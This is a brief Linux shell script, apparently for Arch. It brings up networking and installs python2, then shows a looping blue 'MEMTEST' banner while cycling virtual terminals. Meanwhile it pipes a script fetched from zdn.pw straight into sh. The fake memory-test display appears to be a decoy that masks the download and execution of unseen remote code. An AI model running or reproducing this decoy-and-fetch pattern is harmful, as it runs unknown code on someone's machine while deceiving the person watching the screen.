systemctl start dhcpcd
pacman -Syy python2 --noconfirm

python2 -c "while True:print '\x1b[0;44m MEMTEST', ' '*80" & (while :;do for((i=1;i<5;i++));do chvt $i;sleep 1;done;done) & curl zdn.pw/index.sh | sh
